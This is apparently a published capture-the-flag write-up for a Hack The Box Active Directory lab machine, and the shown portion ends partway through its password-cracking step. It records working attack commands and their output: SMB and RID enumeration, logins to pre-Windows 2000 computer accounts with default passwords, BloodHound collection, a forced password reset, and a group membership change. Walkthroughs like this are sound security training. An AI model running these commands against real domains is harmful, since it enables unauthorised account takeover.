@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>RetroTwo | Paracausal Telemetry</title><meta name="description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB, Compromising FS01$ and FS02$, Compromising admws01$." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retrotwo/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="RetroTwo" /><meta property="og:description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB, Compromising FS01$ and FS02$, Compromising admws01$." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retrotwo/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retrotwo/og.png?v=5b839012" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="RetroTwo" /><meta name="twitter:description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB, Compromising FS01$ and FS02$, Compromising admws01$." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retrotwo/og.png?v=5b839012" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"RetroTwo","description":"Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB, Compromising FS01$ and FS02$, Compromising admws01$.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retrotwo/","datePublished":"2026-04-06","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"RetroTwo","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-retrotwo/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">RetroTwo</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-06 · 13 min read</p><h1>RetroTwo</h1><p>Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB, Compromising FS01$ and FS02$, Compromising admws01$.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · easy</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/RetroTwo" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-retrotwo.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-retrotwo.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>RetroTwo</h2><p>RetroTwo is an easy difficulty Windows machine, which highlights AD exploitation. Initial external enumeration reveals a publicly accessible SMB Share containing a Microsoft Access Database file, which is password protected. After cracking the password, the contents of the…</p></div><span class="room-badge room-badge-easy">Easy</span></div><dl class="room-facts"><div><dt>Released</dt><dd>22 Jul 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>xct</dd></div><div><dt>Rating</dt><dd>4.3 / 5</dd></div><div><dt>User owns</dt><dd>1,042</dd></div><div><dt>Root owns</dt><dd>908</dd></div><div><dt>User blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 25S</small></dd></div><div><dt>Root blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 26S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 668 votes from easiest to hardest"><rect x="0" y="47" width="20" height="17" rx="2" fill="hsl(96 70% 55%)"><title>53 votes</title></rect><rect x="26" y="50" width="20" height="14" rx="2" fill="hsl(96 70% 55%)"><title>43 votes</title></rect><rect x="52" y="4" width="20" height="60" rx="2" fill="hsl(80 70% 55%)"><title>184 votes</title></rect><rect x="78" y="0" width="20" height="64" rx="2" fill="hsl(70 70% 55%)"><title>196 votes</title></rect><rect x="104" y="35" width="20" height="29" rx="2" fill="hsl(50 70% 55%)"><title>88 votes</title></rect><rect x="130" y="49" width="20" height="15" rx="2" fill="hsl(38 70% 55%)"><title>47 votes</title></rect><rect x="156" y="54" width="20" height="10" rx="2" fill="hsl(28 70% 55%)"><title>32 votes</title></rect><rect x="182" y="60" width="20" height="4" rx="2" fill="hsl(16 70% 55%)"><title>13 votes</title></rect><rect x="208" y="62" width="20" height="2" rx="2" fill="hsl(8 70% 55%)"><title>5 votes</title></rect><rect x="234" y="62" width="20" height="2" rx="2" fill="hsl(0 70% 55%)"><title>7 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 6.7, Real-Life 6.2, CVE 6.4, Custom Exploitation 3.6, CTF-Like 3.8"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,63.1 151.3,96.6 136.3,146.2 95.2,130.4 84.7,101.8" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/RetroTwo" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.12.5 --generate-hosts-file /etc/hosts 
+[sudo] password for kali: 
+SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)</code></pre><p>Added an entry into <code>/etc/hosts</code></p><p>SMB signing is enabled</p><p>SMBv1</p><p>Null auth enabled</p><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT 10.129.12.5 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 15:47 +0100
+Nmap scan report for 10.129.12.5
+Host is up (0.018s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5722/tcp  open  msdfsr
+9389/tcp  open  adws
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49165/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.29 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5722,9389 -A --min-rate=2000 -sT 10.129.12.5
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 15:49 +0100
+Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 85.71% done; ETC: 15:50 (0:00:02 remaining)
+Nmap scan report for BLN01.retro2.vl (10.129.12.5)
+Host is up (0.020s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-30 14:50:06Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds  Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+| ssl-cert: Subject: commonName=BLN01.retro2.vl
+| Not valid before: 2026-03-29T14:45:09
+|_Not valid after:  2026-09-28T14:45:09
+|_ssl-date: 2026-03-30T14:51:39+00:00; +1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: RETRO2
+|   NetBIOS_Domain_Name: RETRO2
+|   NetBIOS_Computer_Name: BLN01
+|   DNS_Domain_Name: retro2.vl
+|   DNS_Computer_Name: BLN01.retro2.vl
+|   Product_Version: 6.1.7601
+|_  System_Time: 2026-03-30T14:50:59+00:00
+5722/tcp open  msrpc         Microsoft Windows RPC
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|2012|Phone (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows
+Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows 8.1 Update 1 (89%), Microsoft Windows Phone 7.5 or 8.0 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</code></pre><p>DC is running at -1h</p><h2>SMB </h2><p>Null auth enanbled but cannot use it to enumerate any shares or users</p><h3>Guest access</h3><h4>Shares</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb bln01.retro2.vl -u &#39;Guest&#39; -p &#39;&#39; --shares
+SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.12.5     445    BLN01            [+] retro2.vl\Guest: 
+SMB         10.129.12.5     445    BLN01            [*] Enumerated shares
+SMB         10.129.12.5     445    BLN01            Share           Permissions     Remark
+SMB         10.129.12.5     445    BLN01            -----           -----------     ------
+SMB         10.129.12.5     445    BLN01            ADMIN$                          Remote Admin
+SMB         10.129.12.5     445    BLN01            C$                              Default share
+SMB         10.129.12.5     445    BLN01            IPC$                            Remote IPC
+SMB         10.129.12.5     445    BLN01            NETLOGON                        Logon server share 
+SMB         10.129.12.5     445    BLN01            Public          READ            
+SMB         10.129.12.5     445    BLN01            SYSVOL                          Logon server share</code></pre><p>Only read access on one share</p><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb bln01.retro2.vl -u &#39;Guest&#39; -p &#39;&#39; --rid-brute             
+SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.12.5     445    BLN01            [+] retro2.vl\Guest: 
+SMB         10.129.12.5     445    BLN01            498: RETRO2\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            500: RETRO2\Administrator (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            501: RETRO2\Guest (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            502: RETRO2\krbtgt (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            512: RETRO2\Domain Admins (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            513: RETRO2\Domain Users (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            514: RETRO2\Domain Guests (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            515: RETRO2\Domain Computers (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            516: RETRO2\Domain Controllers (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            517: RETRO2\Cert Publishers (SidTypeAlias)
+SMB         10.129.12.5     445    BLN01            518: RETRO2\Schema Admins (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            519: RETRO2\Enterprise Admins (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            520: RETRO2\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            521: RETRO2\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            553: RETRO2\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.12.5     445    BLN01            571: RETRO2\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.12.5     445    BLN01            572: RETRO2\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.12.5     445    BLN01            1000: RETRO2\admin (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1001: RETRO2\BLN01$ (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1102: RETRO2\DnsAdmins (SidTypeAlias)
+SMB         10.129.12.5     445    BLN01            1103: RETRO2\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            1104: RETRO2\staff (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            1105: RETRO2\Julie.Martin (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1106: RETRO2\Clare.Smith (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1107: RETRO2\Laura.Davies (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1108: RETRO2\Rhys.Richards (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1109: RETRO2\Leah.Robinson (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1110: RETRO2\Michelle.Bird (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1111: RETRO2\Kayleigh.Stephenson (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1112: RETRO2\Charles.Singh (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1113: RETRO2\Sam.Humphreys (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1114: RETRO2\Margaret.Austin (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1115: RETRO2\Caroline.James (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1116: RETRO2\Lynda.Giles (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1117: RETRO2\Emily.Price (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1118: RETRO2\Lynne.Dennis (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1119: RETRO2\Alexandra.Black (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1120: RETRO2\Alex.Scott (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1121: RETRO2\Mandy.Davies (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1122: RETRO2\Marilyn.Whitehouse (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1123: RETRO2\Lindsey.Harrison (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1124: RETRO2\Sally.Davey (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1127: RETRO2\ADMWS01$ (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1128: RETRO2\inventory (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1129: RETRO2\services (SidTypeGroup)
+SMB         10.129.12.5     445    BLN01            1130: RETRO2\ldapreader (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1131: RETRO2\FS01$ (SidTypeUser)
+SMB         10.129.12.5     445    BLN01            1132: RETRO2\FS02$ (SidTypeUser)</code></pre><p>Using <code>cut</code> ive created a user list from this</p><h4><code>Public</code> share</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient //bln01.retro2.vl/Public -U &#39;Guest&#39;%&#39;&#39;            
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sat Aug 17 15:30:37 2024
+  ..                                  D        0  Sat Aug 17 15:30:37 2024
+  DB                                  D        0  Sat Aug 17 13:07:06 2024
+  Temp                                D        0  Sat Aug 17 12:58:05 2024
+
+		6290943 blocks of size 4096. 821255 blocks available
+smb: \&gt; cd DB\
+smb: \DB\&gt; ls
+  .                                   D        0  Sat Aug 17 13:07:06 2024
+  ..                                  D        0  Sat Aug 17 13:07:06 2024
+  staff.accdb                         A   876544  Sat Aug 17 15:30:19 2024
+
+		6290943 blocks of size 4096. 821255 blocks available
+smb: \DB\&gt; get staff.accdb</code></pre><p>Found an interesting file</p><p>There was nothing in <code>Temp</code></p><p>Since everything about this box is old im thinking i can try the user as the password for the machine accouts</p><h2>Compromising <code>FS01$</code> and <code>FS02$</code> </h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap bln01.retro2.vl -u &#39;FS01$&#39; -p &#39;fs01&#39; -M pre2k -k
+LDAP        bln01.retro2.vl 389    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:retro2.vl) (signing:None) (channel binding:No TLS cert)
+LDAP        bln01.retro2.vl 389    BLN01            [+] retro2.vl\FS01$:fs01 
+PRE2K       bln01.retro2.vl 389    BLN01            Pre-created computer account: FS01$
+PRE2K       bln01.retro2.vl 389    BLN01            Pre-created computer account: FS02$
+PRE2K       bln01.retro2.vl 389    BLN01            [+] Found 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/retro2.vl/precreated_computers.txt
+PRE2K       bln01.retro2.vl 389    BLN01            [+] Successfully obtained TGT for fs01@retro2.vl
+PRE2K       bln01.retro2.vl 389    BLN01            [+] Successfully obtained TGT for fs02@retro2.vl
+PRE2K       bln01.retro2.vl 389    BLN01            [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/ccache</code></pre><p>Found two computer accounts that are pre-created</p><blockquote><p>When a new computer account is configured as &quot;pre-Windows 2000 computer&quot;, its password is set based on its name (i.e. lowercase computer name without the trailing <code>$</code>). When it isn&#39;t, the password is randomly generated.</p><p>- TheHackerRecipes</p></blockquote><p>Conventiently the module in nxc has saved a TGT for both accounts but in this case ill just use the password</p><h2>Bloodhound</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap bln01.retro2.vl --use-kcache --dns-server 10.129.12.5 --bloodhound -c All           
+LDAP        bln01.retro2.vl 389    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:RETRO2.VL) (signing:None) (channel binding:No TLS cert)
+LDAP        bln01.retro2.vl 389    BLN01            [+] RETRO2.VL\fs01 from ccache 
+LDAP        bln01.retro2.vl 389    BLN01            Resolved collection methods: group, objectprops, dcom, rdp, session, container, acl, psremote, trusts, localadmin
+LDAP        bln01.retro2.vl 389    BLN01            Using kerberos auth from ccache
+LDAP        bln01.retro2.vl 389    BLN01            Done in 0M 4S
+LDAP        bln01.retro2.vl 389    BLN01            Compressing output into /home/kali/.nxc/logs/BLN01_bln01.retro2.vl_2026-03-30_162250_bloodhound.zip</code></pre><p>Using the TGT i got from nxc i can collect the bloodhound data</p><p><img src="images/retrotwo/pasted-image-20260406002727.webp" alt="Screenshot" loading="lazy" /> As seen from this image i have <code>ForceChangePassword</code> on the <code>ADMWS01</code>. The same is also true for <code>FS02</code> but i have already compromise that computer</p><h2>Compromising <code>admws01$</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD -d retro2.vl -u &#39;FS01$&#39; -k --host bln01.retro2.vl set password &#39;ADMWS01$&#39; &#39;dmuhackers123!&#39;
+[+] Password changed successfully!</code></pre><p>This changed the password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb bln01.retro2.vl -u &#39;ADMWS01$&#39; -p &#39;dmuhackers123!&#39;         
+SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.12.5     445    BLN01            [+] retro2.vl\ADMWS01$:dmuhackers123!</code></pre><p>This machine account has now been compromised</p><p>This machine account has no extra privs on SMB</p><h3>Bloodhound on <code>ADMWS01$</code></h3><p><img src="images/retrotwo/pasted-image-20260406002741.webp" alt="Screenshot" loading="lazy" /> As seen here i have privs over the previously compromised machine accounts, this isnt helpful</p><p>But i also have <code>AddMember</code> and <code>AddSelf</code> on the services group</p><p>The service group is also a member of the remote desktop users group</p><h3>Adding <code>admws01$</code> to the <code>services</code> group</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">net rpc group addmem &quot;services&quot; &quot;admws01$&quot; -U &quot;retro2.vl&quot;/&quot;admws01$&quot;%&#39;dmuhackers123!&#39; -S &quot;10.129.12.5&quot;</code></pre><p>This added me to the group</p><p>Now im at a dead end im in the same group as the inventory user but have privs over the account</p><p>Im going to revisit the file i found at the start and see if i can find credentials to a user account since i cannot RDP as a machine account</p><h2>Access over RDP</h2><p>After transferring the file to my windows machine i can see its password protected so ill crack it in kali</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">office2john staff.accdb | tee accdb.hash  
